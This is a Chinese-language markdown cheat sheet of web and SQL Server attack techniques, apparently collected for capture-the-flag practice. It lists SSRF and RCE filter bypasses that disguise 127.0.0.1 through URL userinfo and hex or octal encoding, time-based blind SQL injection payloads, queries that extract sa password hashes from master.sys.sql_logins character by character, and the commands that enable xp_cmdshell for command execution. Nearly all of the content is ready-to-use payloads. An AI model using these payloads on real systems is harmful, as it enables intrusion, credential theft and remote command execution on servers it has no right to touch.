
# Web

## RCE 命令绕过

包含 www.baidu.com 通过 http://user:pass@host 格式绕过16进制/8进制

`www.baidu.com@127.0.0.2`

绕过 127.0.0.1 , 2-127都可以, 8进制
```txt
127.0.0.2
...
127.0.0.127

curl 127.0.0.0x02
ping 0x7F.0x00.0x00.0x01
ping 0x7F000001
ping 0177.0000.0000.0001
```

## SSRF

1. 不存在路径绕过

`url=/http/../flag`

2. 通过127.0.0.2 ... 127


## curl 使用
curl -i -L
```txt
-i, --include       Incluude protocol response headers in the output
-L, --location      Follow redirects
```


# SQL 注入

## SQL Server
https://www.w3schools.com/sql/sql_ref_sqlserver.asp

```sql
-- db name
Select Name From Master..SysDataBases Where DbId=(Select Dbid From Master..SysProcesses Where Spid = @@spid)
-- stack query
-- if else
SELECT IIF(500<1000, 'YES', 'NO');
if (1=1) waitfor delay '00:00:1' else select 2
-- blind
?id=1' waitfor delay '00:00:2'--'

-- current-user
select CURRENT_USER;
select SYSTEM_USER;
select USER_NAME();

-- functions
ascii,char,charindex,concat,concat with +,concat_ws,datalength,difference,format,left,len,lower,ltrim,nchar,patindex,quotename,replace,replicate,reverse,right,rtrim,soundex,space,str,stuff,substring,translate,trim,unicode,upper
select case when 1=1 then 0 else 2 end  -- if else 
if (1<0) Begin select 'true' End Else Begin select 'false' End -- if else 2

-- sa passwords
select *  FROM master.sys.sql_logins
select *  FROM [master].[sys].[sql_logins]
SELECT name, CAST(CONVERT(varchar(max), password_hash, 1) AS varchar)  FROM master.sys.sql_logins -- 0x0102  https://docs.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql?view=sql-server-ver16
SELECT name, CAST(CONVERT(varchar(max), password_hash, 2) AS varchar)  FROM master.sys.sql_logins -- 0102

select case when  ascii(SUBSTRING(CAST(CONVERT(varchar(max), password_hash, 2) AS varchar), 1, 1))=48  then 1 else 2 end FROM master.sys.sql_logins -- 判断第二位是否为0
select case when  ascii(SUBSTRING(CAST(CONVERT(varchar(max), password_hash, 2) AS varchar), 2, 1))=49  then 1 else 2 end FROM master.sys.sql_logins -- 判断第二位是否为1


SELECT HOST_NAME()  -- 主机名
SELECT HOST_NAME() AS HostName, SUSER_NAME() LoggedInUser -- SUSER_NAME sa
-- 在master - 视图里
```

启动 xp_cmdshell
```
sp_configure 'show advanced options',1
reconfigure
go
sp_configure 'xp_cmdshell',1
reconfigure
go
```